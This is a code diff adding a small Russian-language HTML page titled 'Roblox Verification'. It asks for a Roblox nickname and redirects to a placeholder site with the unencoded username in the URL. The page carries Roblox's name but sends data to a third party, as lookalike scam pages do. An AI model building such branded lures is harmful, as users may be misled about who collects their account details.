@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Verification</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <img src="icon.jpg" alt="Logo" class="logo">
+        <input type="text" id="username" placeholder="Введите ваш Roblox никнейм">
+        <button onclick="verify()">Verify</button>
+    </div>
+
+    <script>
+        function verify() {
+            let username = document.getElementById("username").value;
+            if (username) {
+                window.location.href = `https://твой-сайт/api/verify?username=${username}`;
+            }
+        }
+    </script>
+</body>
+</html>
